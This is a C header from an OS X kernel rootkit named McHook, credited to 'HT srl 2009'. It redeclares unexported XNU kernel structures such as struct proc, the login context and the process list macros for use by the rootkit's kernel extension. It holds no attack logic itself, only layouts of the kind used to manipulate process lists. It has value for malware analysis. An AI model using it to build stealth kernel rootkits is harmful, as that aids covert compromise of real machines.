/*
 * McHook, proc_internal.h
 *  OS X KSpace Rootkit
 *
 *  Definitions needed by the KEXT and not exported
 * 
 * Created by revenge on 20/03/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#ifndef _SYS_PROC_INTERNAL_H_
#define	_SYS_PROC_INTERNAL_H_

#include <libkern/OSAtomic.h>
#include <sys/proc.h>
__BEGIN_DECLS
#include <kern/locks.h>
__END_DECLS

#define decl_lck_mtx_data(class,name)     class lck_mtx_t name;

/*
 * Added by SPARTA, Inc.
 */
/*
 * Login context.
 */
struct lctx {
  LIST_ENTRY(lctx) lc_list;	/* List of all login contexts. */
  LIST_HEAD(, proc) lc_members;	/* Pointer to lc members. */
  int		lc_mc;		/* Member Count. */
  pid_t		lc_id;		/* Login context ID. */

  struct label	*lc_label;	/* Login context MAC label. */
};


struct proc;

#define PROC_NULL (struct proc *)0

/*
 * Description of a process.
 *
 * This structure contains the information needed to manage a thread of
 * control, known in UN*X as a process; it has references to substructures
 * containing descriptions of things that the process uses, but may share
 * with related processes.  The process structure and the substructures
 * are always addressible except for those marked "(PROC ONLY)" below,
 * which might be addressible only on a processor on which the process
 * is running.
 */
struct	proc {
  LIST_ENTRY(proc) p_list;		/* List of all processes. */

  pid_t		p_pid;			/* Process identifier. (static)*/
  void * 	task;			/* corresponding task (static)*/
  struct	proc *	p_pptr;		 	/* Pointer to parent process.(LL) */
  pid_t		p_ppid;			/* process's parent pid number */
  pid_t		p_pgrpid;		/* process group id of the process (LL)*/


  char		p_stat;			/* S* process status. (PL)*/
  char		p_shutdownstate;
  char		p_kdebug;		/* P_KDEBUG eq (CC)*/ 
  char		p_btrace;		/* P_BTRACE eq (CC)*/

  LIST_ENTRY(proc) p_pglist;		/* List of processes in pgrp.(PGL) */
  LIST_ENTRY(proc) p_sibling;		/* List of sibling processes. (LL)*/
  LIST_HEAD(, proc) p_children;		/* Pointer to list of children. (LL)*/
  TAILQ_HEAD( , uthread) p_uthlist; 	/* List of uthreads  (PL) */

  LIST_ENTRY(proc) p_hash;		/* Hash chain. (LL)*/
  TAILQ_HEAD( ,eventqelt) p_evlist;	/* (PL) */


  /* substructures: */
  kauth_cred_t	p_ucred;		/* Process owner's identity. (PL) */
  struct  filedesc *p_fd;			/* Ptr to open files structure. (PFDL) */
  struct  pstats *p_stats;		/* Accounting/statistics (PL). */
  struct  plimit *p_limit;		/* Process limits.(PL) */

  struct	sigacts *p_sigacts;		/* Signal actions, state (PL) */

#define	p_rlimit	p_limit->pl_rlimit

  struct	plimit *p_olimit;		/* old process limits  - not inherited by child  (PL) */
  unsigned int	p_flag;			/* P_* flags. (atomic bit ops) */
  unsigned int	p_lflag;		/* local flags  (PL) */
  unsigned int	p_listflag;		/* list flags (LL) */
  unsigned int	p_ladvflag;		/* local adv flags (atomic) */
  int		p_refcount;		/* number of outstanding users(LL) */
  int		p_childrencnt;		/* children holding ref on parent (LL) */
  int		p_parentref;		/* children lookup ref on parent (LL) */

  pid_t		p_oppid;	 	/* Save parent pid during ptrace. XXX */
  u_int		p_xstat;		/* Exit status for wait; also stop signal. */

#ifdef _PROC_HAS_SCHEDINFO_
  /* may need cleanup, not used */
  u_int		p_estcpu;	 	/* Time averaged value of p_cpticks.(used by aio and proc_comapre) */
  fixpt_t		p_pctcpu;	 	/* %cpu for this process during p_swtime (used by aio)*/
  u_int		p_slptime;		/* used by proc_compare */
#endif /* _PROC_HAS_SCHEDINFO_ */

  struct	itimerval p_realtimer;		/* Alarm timer. (PSL) */
  struct	timeval p_rtime;		/* Real time.(PSL)  */
  struct	itimerval p_vtimer_user;	/* Virtual timers.(PSL)  */
  struct	itimerval p_vtimer_prof;	/* (PSL) */

  struct	timeval	p_rlim_cpu;		/* Remaining rlim cpu value.(PSL) */
  int		p_debugger;		/*  NU 1: can exec set-bit programs if suser */
  boolean_t	sigwait;	/* indication to suspend (PL) */
  void	*sigwait_thread;	/* 'thread' holding sigwait(PL)  */
  void	*exit_thread;		/* Which thread is exiting(PL)  */
  int	p_vforkcnt;		/* number of outstanding vforks(PL)  */
      void *  p_vforkact;     	/* activation running this vfork proc)(static)  */
  int	p_fpdrainwait;		/* (PFDL) */
  pid_t	p_contproc;	/* last PID to send us a SIGCONT (PL) */

  /* Following fields are info from SIGCHLD (PL) */
  pid_t	si_pid;			/* (PL) */
  u_int   si_status;		/* (PL) */
  u_int	si_code;		/* (PL) */
  uid_t	si_uid;			/* (PL) */

  void * vm_shm;			/* (SYSV SHM Lock) for sysV shared memory */

#if CONFIG_DTRACE
  user_addr_t			p_dtrace_argv;			/* (write once, read only after that) */
  user_addr_t			p_dtrace_envp;			/* (write once, read only after that) */
  int				p_dtrace_probes;		/* (PL) are there probes for this proc? */
  u_int				p_dtrace_count;			/* (sprlock) number of DTrace tracepoints */
  struct dtrace_ptss_page*	p_dtrace_ptss_pages;		/* (sprlock) list of user ptss pages */
  struct dtrace_ptss_page_entry*	p_dtrace_ptss_free_list;	/* (atomic) list of individual ptss entries */
  struct dtrace_helpers*		p_dtrace_helpers;		/* (dtrace_lock) DTrace per-proc private */
  struct dof_ioctl_data*		p_dtrace_lazy_dofs;		/* (sprlock) unloaded dof_helper_t's */
#endif /* CONFIG_DTRACE */

/* XXXXXXXXXXXXX BCOPY'ed on fork XXXXXXXXXXXXXXXX */
/* The following fields are all copied upon creation in fork. */
#define	p_startcopy	p_argslen

  u_int	p_argslen;	 /* Length of process arguments. */
  int  	p_argc;			/* saved argc for sysctl_procargs() */
  user_addr_t user_stack;		/* where user stack was allocated */
  struct	vnode *p_textvp;	/* Vnode of executable. */
  off_t	p_textoff;		/* offset in executable vnode */

  sigset_t p_sigmask;		/* DEPRECATED */
  sigset_t p_sigignore;	/* Signals being ignored. (PL) */
  sigset_t p_sigcatch;	/* Signals being caught by user.(PL)  */

  u_char	p_priority;	/* (NU) Process priority. */
  u_char	p_resv0;	/* (NU) User-priority based on p_cpu and p_nice. */
  char	p_nice;		/* Process "nice" value.(PL) */
  u_char	p_resv1;	/* (NU) User-priority based on p_cpu and p_nice. */

//#if CONFIG_MACF
  int	p_mac_enforce;			/* MAC policy enforcement control */
//#endif

  char	p_comm[MAXCOMLEN+1];
  char	p_name[(2*MAXCOMLEN)+1];	/* PL */

  struct 	pgrp *p_pgrp;	/* Pointer to process group. (LL) */
  int		p_iopol_disk;	/* disk I/O policy (PL) */
  uint32_t	p_csflags;	/* flags for codesign (PL) */

/* End area that is copied on creation. */
/* XXXXXXXXXXXXX End of BCOPY'ed on fork (AIOLOCK)XXXXXXXXXXXXXXXX */
#define	p_endcopy	aio_active_count
  int		aio_active_count;	/* entries on aio_activeq */
  int		aio_done_count;		/* entries on aio_doneq */
  TAILQ_HEAD( , aio_workq_entry ) aio_activeq; /* active async IO requests */
  TAILQ_HEAD( , aio_workq_entry ) aio_doneq;	 /* completed async IO requests */

  struct	rusage *p_ru;	/* Exit information. (PL) */
  thread_t 	p_signalholder;
  thread_t 	p_transholder;

  /* DEPRECATE following field  */
  u_short	p_acflag;	/* Accounting flags. */

  struct lctx *p_lctx;		/* Pointer to login context. */
  LIST_ENTRY(proc) p_lclist;	/* List of processes in lctx. */
  user_addr_t 	p_threadstart;		/* pthread start fn */
  user_addr_t 	p_wqthread;		/* pthread workqueue fn */
  int 	p_pthsize;			/* pthread size */
  void * 	p_wqptr;			/* workq ptr */
  int 	p_wqsize;			/* allocated size */
  struct  timeval p_start;        	/* starting time */
  void *	p_rcall;
  int		p_ractive;
  int	p_idversion;		/* version of process identity */
#if DIAGNOSTIC
  unsigned int p_fdlock_pc[4];
  unsigned int p_fdunlock_pc[4];
#if SIGNAL_DEBUG
  unsigned int lockpc[8];
  unsigned int unlockpc[8];
#endif /* SIGNAL_DEBUG */
#endif /* DIAGNOSTIC */
};

/* Lock and unlock a login context. */
#define LCTX_LOCK(lc)	lck_mtx_lock(&(lc)->lc_mtx)
#define LCTX_UNLOCK(lc)	lck_mtx_unlock(&(lc)->lc_mtx)
#define LCTX_LOCKED(lc)
//#define LCTX_LOCK_ASSERT(lc, type)
//#define ALLLCTX_LOCK	lck_mtx_lock(&alllctx_lock)
//#define ALLLCTX_UNLOCK	lck_mtx_unlock(&alllctx_lock)
//extern lck_grp_t * lctx_lck_grp;
//extern lck_grp_attr_t * lctx_lck_grp_attr;
//extern lck_attr_t * lctx_lck_attr;

#define	PIDHASH(pid)	(&pidhashtbl[(pid) & pidhash])
//extern LIST_HEAD(pidhashhead, proc) *pidhashtbl;
//extern u_long pidhash;

#define	PGRPHASH(pgid)	(&pgrphashtbl[(pgid) & pgrphash])
//extern LIST_HEAD(pgrphashhead, pgrp) *pgrphashtbl;
//extern u_long pgrphash;
#define	SESSHASH(sessid) (&sesshashtbl[(sessid) & sesshash])
//extern LIST_HEAD(sesshashhead, session) *sesshashtbl;
//extern u_long sesshash;

//extern lck_grp_t * proc_lck_grp;
//extern lck_grp_attr_t * proc_lck_grp_attr;
//extern lck_attr_t * proc_lck_attr;

LIST_HEAD(proclist, proc);

//extern struct proclist allproc;		/* List of all processes. */

#endif	/* !_SYS_PROC_INTERNAL_H_ */